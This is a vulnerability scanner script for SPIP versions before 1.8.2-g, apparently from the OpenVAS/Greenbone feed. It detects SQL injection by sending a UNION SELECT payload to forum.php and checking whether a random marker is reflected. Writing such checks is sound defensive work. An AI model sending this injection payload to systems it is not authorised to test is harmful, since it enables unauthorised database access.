# SPDX-FileCopyrightText: 2006 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:spip:spip";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20978");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-0517", "CVE-2006-0518", "CVE-2006-0519");

  script_name("SPIP < 1.8.2-g Multiple SQLi and XSS Vulnerabilities");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2006 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_spip_http_detect.nasl");
  script_mandatory_keys("spip/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"SPIP is prone to multiple SQL injection (SQLi) and cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"impact", value:"An attacker could send a specially crafted URL to modify SQL
  requests, for example, to obtain the admin password hash, or execute malicious script code on the
  remote system.");

  script_tag(name:"affected", value:"SPIP versions prior to 1.8.2-g.");

  script_tag(name:"solution", value:"Update to SPIP version 1.8.2-g or later.");

  script_xref(name:"URL", value:"http://www.zone-h.org/en/advisories/read/id=8650/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16458");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16461");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/423655/30/0/threaded");
  script_xref(name:"URL", value:"http://listes.rezo.net/archives/spip-en/2006-02/msg00002.html");
  script_xref(name:"URL", value:"http://listes.rezo.net/archives/spip-en/2006-02/msg00004.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = make_list( "/forum.php3", "/forum.php" );

foreach file( files ) {

  magic = rand();
  url = dir + file + '?id_article=1&id_forum=-1/**/UNION/**/SELECT%20' +  magic + '/*';
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;

  if (string('value="&gt; ', magic, '" class="forml"') >< res) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
